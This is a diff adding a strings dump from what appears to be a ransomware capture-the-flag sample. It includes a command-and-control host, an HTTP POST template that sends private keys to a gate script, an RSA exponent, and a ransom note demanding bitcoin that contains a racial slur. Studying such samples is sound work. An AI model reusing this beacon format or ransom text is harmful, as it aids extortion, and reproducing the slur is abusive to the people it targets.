@@ -1,0 +1,13 @@
+The file to encrypt has not been found.>
+65537
+Oh oh oh... something went wrong.>
+INSAd64f428d49e137f68198597ea46d36df
+cnc.challenge-by.ovh
+POST /gate.php HTTP/1.1<>User-Agent: Crypt0r<>Host: crypt0r.gate<>Content-Type: application/json<><>
+{>    "pigeonID": "%s",>    "privateKey": "%s",>    "crypt0rKey": "%s">  }
+      ____                  _    ___       >     / ___|_ __ _   _ _ __ | |_ / _ \ _ __ >    | |   | '__| | | | '_ \| __| | | | '__|>    | |___| |  | |_| | |_) | |_| |_| | |   >     \____|_|   \__, | .__/ \__|\___/|_|   >                |___/|_|                   >>>   !!  You've been Crypt0riz3d nigga  !!>>Send 50 bitcoins on my wallet to get back>your file and send me the following code:>                 %s>>If you don't, in 7 days it's gonna be 100.>>Your file has been encrypted using RSA>algorithm, only my decrypt0r can give you>the file back.>>~~~ Cyber Super Villain of the Darknet ~~~>>
+crypt.me
+decrypt.me
+{>  "action": "%s",>  "data": %s}>
+null>
+
